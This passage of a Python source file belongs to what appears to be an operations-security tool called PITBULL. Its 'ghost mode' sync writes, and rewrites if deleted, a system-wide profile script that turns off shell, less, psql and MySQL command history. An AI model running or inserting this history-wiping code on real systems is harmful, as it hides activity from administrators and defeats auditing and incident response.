                "synced": True,
                "actions": actions,
                "message": "Ghost mode re-synced: profile script was on disk, env vars re-applied and flag set.",
            }

        elif not profile_exists and self._ghost_active:
            # Someone deleted the profile script but flag is still set
            ghost_profile = """# PITBULL Ghost Mode — disable shell history system-wide
unset HISTFILE
export HISTSIZE=0
export HISTFILESIZE=0
export HISTCONTROL=ignorespace
export LESSHISTFILE=/dev/null
export PSQL_HISTORY=/dev/null
export MYSQL_HISTFILE=/dev/null
"""
            try:
                with open("/etc/profile.d/pitbull-ghost.sh", "w") as f:
                    f.write(ghost_profile)
                os.chmod("/etc/profile.d/pitbull-ghost.sh", 0o644)
                actions.append("recreated_profile_script")
                logger.info("Ghost mode SYNC: recreated missing profile script")
            except Exception as e:
                actions.append(f"failed_to_recreate_profile: {e}")

            return {
                "status": "ok",
                "mode": "ghost",
                "active": True,
                "synced": True,
                "actions": actions,
                "message": "Ghost mode re-synced: profile script was missing, recreated.",
            }

        else:
            # Already in sync (both true or both false)
            mode = "ghost" if self._ghost_active else "normal"
            return {
                "status": "ok",
                "mode": mode,
                "active": self._ghost_active,
                "synced": True,
                "actions": ["no_action_needed"],
                "message": f"Ghost mode already in sync (mode={mode}).",
            }


# ── Singleton ───────────────────────────────────────────────────────

opsec_manager = OpSecManager()